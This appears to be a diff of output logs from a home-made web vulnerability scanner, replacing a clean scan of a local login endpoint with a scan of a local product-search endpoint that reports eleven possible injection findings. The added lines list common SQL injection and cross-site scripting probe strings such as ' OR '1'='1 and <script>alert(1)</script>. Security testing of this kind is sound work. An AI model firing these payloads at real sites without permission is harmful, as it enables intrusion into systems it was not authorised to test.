@@ -1,4 +1,18 @@
---- Scanning: http://127.0.0.1:8080/rest/user/login (method=POST) ---
-[INFO] Fingerprint for http://127.0.0.1:8080/rest/user/login: {'server': None, 'language': None, 'database': None, 'evidence': []}
-[OK] No issues detected (basic heuristics) for: http://127.0.0.1:8080/rest/user/login
-Scan finished in 0.03s. Findings: 0
+--- Scanning: http://localhost:3000/rest/products/search?q=test (method=GET) ---
+[INFO] Fingerprint for http://localhost:3000/rest/products/search?q=test: {'server': None, 'language': 'php', 'database': None, 'evidence': ['language:php matched /\\bphp\\b/']}
+[TIME] Baseline avg for http://localhost:3000/rest/products/search?q=test: 0.038s (samples=3)
+[UNION] Trying UNION phase on http://localhost:3000/rest/products/search?q=test param q
+[UNION] ORDER BY 1 failed for http://localhost:3000/rest/products/search?q=test%27+ORDER+BY+1--+-
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: ' -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: " -- response length changed by 1363.5% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: ' OR '1'='1 -- response length changed by 2401.7% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: " OR "1"="1 -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload:  OR 1=1-- -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: <script>alert(1)</script> -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: "><script>alert(1)</script> -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: <img src=x onerror=alert(1)> -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: ";alert(1);// -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: </script><script>alert(1)</script> -- response length changed by 93.6% (score=15)
+[VULN] Possible Injection on http://localhost:3000/rest/products/search?q=test param/key 'q' payload: " autofocus onfocus=alert(1) x=" -- response length changed by 93.6% (score=15)
+Scan finished in 1.31s. Findings: 11
+Structured JSON report saved to report.json
